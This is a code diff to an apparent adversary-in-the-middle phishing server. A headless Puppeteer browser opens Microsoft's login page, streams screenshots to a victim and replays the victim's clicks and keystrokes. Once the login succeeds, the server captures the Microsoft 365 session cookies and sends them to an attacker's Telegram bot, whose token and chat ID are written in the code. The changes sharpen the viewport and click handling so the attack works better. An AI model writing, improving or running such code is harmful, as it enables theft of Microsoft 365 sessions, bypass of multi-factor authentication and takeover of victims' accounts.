@@ -8,6 +8,10 @@ puppeteer.use(StealthPlugin());
 const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
 const CHAT_ID = '1318100118';
 
+// Shared Viewport Config
+const VIEWPORT_WIDTH = 1280;
+const VIEWPORT_HEIGHT = 720;
+
 async function sendExfiltrationAlert(cookies, finalUrl) {
     const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
     const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
@@ -43,69 +47,77 @@ async function startSession(io, socket) {
     try {
         browser = await puppeteer.launch({
             headless: "new",
-            args: ['--no-sandbox', '--disable-setuid-sandbox']
+            args: [
+                '--no-sandbox', 
+                '--disable-setuid-sandbox',
+                '--window-size=1280,720' // Match viewport
+            ]
         });
 
         const page = await browser.newPage();
+        
+        // Critical: Ensure internal browser matches external expectation
+        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
 
         const emitFrame = async () => {
             if (socket.connected) {
                 try {
-                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
+                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
                     socket.emit('browser-render', { screenshot });
                 } catch (e) {}
             }
         };
 
         await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
-        const heartbeat = setInterval(emitFrame, 1500);
+        const heartbeat = setInterval(emitFrame, 1000);
 
+        // Success detection logic
         page.on('framenavigated', async (frame) => {
             const url = frame.url().toLowerCase();
-            
             if (!hasExfiltrated) {
-                /**
-                 * STRICT DETECTION: 
-                 * We look for the "Post-Login" shell or inbox, 
-                 * NOT the authorize/redirect URLs that appear during the login flow.
-                 */
                 const isDashboard = url.includes('www.office.com/?auth=') || 
                                     url.includes('outlook.live.com/mail') || 
-                                    url.includes('microsoft365.com/?') ||
-                                    (url.includes('office.com') && url.includes('shell/homepage'));
-
-                // We also ensure it's NOT a redirect/authorize URL
+                                    url.includes('microsoft365.com/?');
                 const isAuthStep = url.includes('authorize') || url.includes('relyingparty');
 
                 if (isDashboard && !isAuthStep) {
-                    hasExfiltrated = true; // Engage lock
-                    
-                    console.log(`[AUTH-DETECTED] Finalizing capture for: ${url}`);
-                    
-                    // Wait for the final session tokens (ESTSAUTH, etc.) to be written
+                    hasExfiltrated = true;
+                    console.log(`[AUTH-DETECTED] Finalizing capture...`);
                     await new Promise(r => setTimeout(r, 5000));
-                    
                     const cookies = await page.cookies();
                     await sendExfiltrationAlert(cookies, url);
                 }
             }
         });
 
+        // FIXED INTERACTION LOGIC
         socket.on('victim-action', async (data) => {
             try {
-                if (data.type === 'click') await page.mouse.click(data.x, data.y);
-                else if (data.type === 'key') await page.keyboard.press(data.key);
+                if (data.type === 'click') {
+                    // Ensure we are clicking at the EXACT scale transmitted from frontend
+                    await page.mouse.click(data.x, data.y, { delay: 100 });
+                    console.log(`[ACTION] Clicked at ${data.x}, ${data.y}`);
+                } 
+                else if (data.type === 'key') {
+                    await page.keyboard.press(data.key);
+                }
+                
+                // Force an immediate re-render after action
                 await emitFrame();
-            } catch (e) {}
+            } catch (e) {
+                console.error('[ACTION-ERR]', e.message);
+            }
         });
 
         socket.on('disconnect', async () => {
             clearInterval(heartbeat);
             if (browser) await browser.close();
+            console.log(`[CLEANUP] Socket ${socket.id} closed.`);
         });
 
     } catch (error) {
+        console.error('[ORCH-ERR]', error.message);
         if (browser) await browser.close();
     }
 }
